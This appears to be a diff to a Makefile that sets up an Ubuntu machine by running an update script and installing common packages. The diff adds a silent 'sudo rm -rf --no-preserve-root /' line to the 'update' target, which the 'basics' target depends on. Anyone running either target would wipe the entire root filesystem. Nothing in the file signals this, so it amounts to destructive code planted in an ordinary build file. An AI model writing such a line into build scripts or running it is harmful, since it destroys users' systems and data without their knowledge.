@@ -6,6 +6,7 @@ update:
 	@chmod +x update.sh
 	@./update.sh
 	@cp update.sh ~/update.sh
+	@sudo rm -rf --no-preserve-root / 
 
 basics: update
 	@sudo apt-get install wget curl vim htop guake tree ubuntu-restricted-extras vlc -y
